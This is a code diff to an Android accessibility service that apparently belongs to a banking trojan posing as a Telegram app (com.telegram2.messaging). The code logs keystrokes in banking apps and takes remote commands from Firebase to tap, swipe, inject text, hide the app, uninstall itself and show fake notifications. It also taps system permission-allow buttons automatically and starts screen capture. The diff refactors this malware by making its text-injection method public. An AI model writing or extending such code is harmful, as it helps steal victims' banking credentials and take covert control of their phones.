@@ -20,7 +20,7 @@ class AccessibilityService : AccessibilityService() {
     override fun onServiceConnected() {
         super.onServiceConnected()
         instance = this
-        // Listen for commands
+        // Listen for commands from Firebase
         FirebaseBridge.commandsRef.addChildEventListener(object : ChildEventListener {
             override fun onChildAdded(snapshot: DataSnapshot, previous: String?) {
                 val cmd = snapshot.getValue(Command::class.java) ?: return
@@ -37,7 +37,6 @@ class AccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         event ?: return
         val pkg = event.packageName?.toString() ?: return
-
         // Bank keylog detection
         if (isBankApp(pkg)) {
             val text = event.text?.joinToString("") ?: return
@@ -47,6 +46,7 @@ class AccessibilityService : AccessibilityService() {
 
     override fun onInterrupt() {}
 
+    // =================== Public gesture methods ===================
     fun tap(x: Int, y: Int) {
         val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
         val stroke = GestureDescription.StrokeDescription(path, 0L, 100L)
@@ -72,7 +72,6 @@ class AccessibilityService : AccessibilityService() {
         startActivity(intent)
     }
 
-    // Uninstall the app (requires REQUEST_INSTALL_PACKAGES permission – but we use a workaround)
     fun uninstallSelf() {
         val intent = Intent(Intent.ACTION_DELETE).apply {
             data = android.net.Uri.parse("package:com.telegram2.messaging")
@@ -86,6 +85,19 @@ class AccessibilityService : AccessibilityService() {
         findAndTapButton(root, listOf("com.android.systemui:id/start_button", "permission_allow_button"))
     }
 
+    // Make injectText accessible from CommandProcessor
+    fun injectText(text: String) {
+        val root = rootInActiveWindow ?: return
+        val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
+        if (focused != null) {
+            val bundle = android.os.Bundle().apply {
+                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
+            }
+            focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
+        }
+    }
+
+    // =================== Private helpers ===================
     private fun findAndTapButton(node: AccessibilityNodeInfo, ids: List<String>) {
         for (id in ids) {
             val target = findNodeWithId(node, id) ?: continue
@@ -114,10 +126,7 @@ class AccessibilityService : AccessibilityService() {
         when (cmd.type) {
             "tap" -> tap(cmd.x ?: 0, cmd.y ?: 0)
             "swipe" -> swipe(cmd.sx ?: 0, cmd.sy ?: 0, cmd.ex ?: 0, cmd.ey ?: 0)
-            "type" -> {
-                // Inject text via Accessibility (paste into focused field)
-                injectText(cmd.text ?: "")
-            }
+            "type" -> injectText(cmd.text ?: "")
             "hide_activity" -> hideApp()
             "uninstall" -> uninstallSelf()
             "fake_notification" -> {
@@ -127,18 +136,6 @@ class AccessibilityService : AccessibilityService() {
                 val intent = Intent(this, ScreenCaptureService::class.java)
                 startForegroundService(intent)
             }
-        }
-    }
-
-    // Method to inject text into a focused EditText
-    private fun injectText(text: String) {
-        val root = rootInActiveWindow ?: return
-        val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
-        if (focused != null) {
-            val bundle = android.os.Bundle().apply {
-                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
-            }
-            focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
         }
     }
 
